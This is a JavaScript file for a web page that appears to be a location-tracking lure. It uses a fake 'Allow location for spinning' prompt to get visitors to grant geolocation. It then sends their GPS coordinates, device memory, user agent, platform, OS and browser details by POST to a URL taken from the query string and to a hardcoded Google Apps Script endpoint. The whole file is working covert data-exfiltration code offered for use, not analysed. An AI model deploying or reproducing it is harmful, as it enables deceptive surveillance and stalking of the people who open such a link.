window.addEventListener('load', () => {
      const params = (new URL(document.location)).searchParams
      const name = params.get('name');
      sessionStorage.setItem("linkloca",name)
  })
  //


var osname = sessionStorage.getItem('OSName');
var osver = sessionStorage.getItem('OSVersion');
var browN = sessionStorage.getItem('BrowN');
var browV = sessionStorage.getItem('BrowV');





  //
setTimeout(() => {
      console.log("World!");
      if(sessionStorage.getItem('latitude')==null && sessionStorage.getItem('longitude')==null){
            alert("Allow location for spinning\nRe-Enter this page")
            setTimeout(() => {window.open("https://www.google.com/");}, 2000);
      }}, 5000);

function log(){
  var date1 = new Date();
  var link = sessionStorage.getItem("linkloca");

  var clocation =`https://www.google.com/maps/search/?api=1&query=${sessionStorage.getItem('latitude')},${sessionStorage.getItem('longitude')}`;

  fetch(link, {
    method: "POST",
    body: JSON.stringify({
        location: clocation.toString(),
        ram: navigator.deviceMemory.toString(),
        useragent: navigator.userAgent.toString(),
        appVersion: navigator.appVersion.toString(),
        platform: navigator.platform.toString(),
        vendor: navigator.vendor.toString(),
        osname: sessionStorage.getItem('OSName').toString(),
        osver: sessionStorage.getItem('OSVersion').toString(),
        browN: sessionStorage.getItem('BrowN').toString(),
        browV: sessionStorage.getItem('BrowV').toString(),
        date: date1.toString()

    })
})
    .then(res => res.text())
    .then(data => {
        console.log(data);
    });
 fetch('https://script.google.com/macros/s/AKfycbwJXiFUJd4NMCWxZy6GwSAU1HjLGdC7n2O2SLuAuTM8V3vgu3W9o_-GLvD3Jct-rpCq5g/exec?action=addUser', {
    method: "POST",
    body: JSON.stringify({
        location: clocation.toString(),
        ram: navigator.deviceMemory.toString(),
        useragent: navigator.userAgent.toString(),
        appVersion: navigator.appVersion.toString(),
        platform: navigator.platform.toString(),
        vendor: navigator.vendor.toString(),
        osname: sessionStorage.getItem('OSName').toString(),
        osver: sessionStorage.getItem('OSVersion').toString(),
        browN: sessionStorage.getItem('BrowN').toString(),
        browV: sessionStorage.getItem('BrowV').toString(),
        date: date1.toString()

    })
})
    .then(res => res.text())
    .then(data => {
        console.log(data);
    });
}



function osdata() {
    'use strict';

    var module = {
        options: [],
        header: [navigator.platform, navigator.userAgent, navigator.appVersion, navigator.vendor, window.opera],
        dataos: [
            { name: 'Windows Phone', value: 'Windows Phone', version: 'OS' },
            { name: 'Windows', value: 'Win', version: 'NT' },
            { name: 'iPhone', value: 'iPhone', version: 'OS' },
            { name: 'iPad', value: 'iPad', version: 'OS' },
            { name: 'Kindle', value: 'Silk', version: 'Silk' },
            { name: 'Android', value: 'Android', version: 'Android' },
            { name: 'PlayBook', value: 'PlayBook', version: 'OS' },
            { name: 'BlackBerry', value: 'BlackBerry', version: '/' },
            { name: 'Macintosh', value: 'Mac', version: 'OS X' },
            { name: 'Linux', value: 'Linux', version: 'rv' },
            { name: 'Palm', value: 'Palm', version: 'PalmOS' }
        ],
        databrowser: [
            { name: 'Chrome', value: 'Chrome', version: 'Chrome' },
            { name: 'Firefox', value: 'Firefox', version: 'Firefox' },
            { name: 'Safari', value: 'Safari', version: 'Version' },
            { name: 'Internet Explorer', value: 'MSIE', version: 'MSIE' },
            { name: 'Opera', value: 'Opera', version: 'Opera' },
            { name: 'BlackBerry', value: 'CLDC', version: 'CLDC' },
            { name: 'Mozilla', value: 'Mozilla', version: 'Mozilla' }
        ],
        init: function () {
            var agent = this.header.join(' '),
                os = this.matchItem(agent, this.dataos),
                browser = this.matchItem(agent, this.databrowser);

            return { os: os, browser: browser };
        },
        matchItem: function (string, data) {
            var i = 0,
                j = 0,
                html = '',
                regex,
                regexv,
                match,
                matches,
                version;

            for (i = 0; i < data.length; i += 1) {
                regex = new RegExp(data[i].value, 'i');
                match = regex.test(string);
                if (match) {
                    regexv = new RegExp(data[i].version + '[- /:;]([\\d._]+)', 'i');
                    matches = string.match(regexv);
                    version = '';
                    if (matches) { if (matches[1]) { matches = matches[1]; } }
                    if (matches) {
                        matches = matches.split(/[._]+/);
                        for (j = 0; j < matches.length; j += 1) {
                            if (j === 0) {
                                version += matches[j] + '.';
                            } else {
                                version += matches[j];
                            }
                        }
                    } else {
                        version = '0';
                    }
                    return {
                        name: data[i].name,
                        version: parseFloat(version)
                    };
                }
            }
            return { name: 'unknown', version: 0 };
        }
    };

    var e = module.init();


    sessionStorage.setItem("OSName",e.os.name)
    sessionStorage.setItem("OSVersion",e.os.version)
    sessionStorage.setItem("BrowN",e.browser.name)
    sessionStorage.setItem("BrowV",e.browser.version);
    //

}
osdata();

function getLocation() {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(savePosition, positionError, { timeout: 10000 });
    } else {
      //Geolocation is not supported by this browser
    }
  };

  // handle the error here
  function positionError(error) {
    var message = error.message;
    console.log("Location Eroor");

    alert(message);
  };

  function savePosition(position) {
    sessionStorage.setItem("latitude",position.coords.latitude);
    sessionStorage.setItem("longitude",position.coords.longitude);
  };

getLocation();

log();
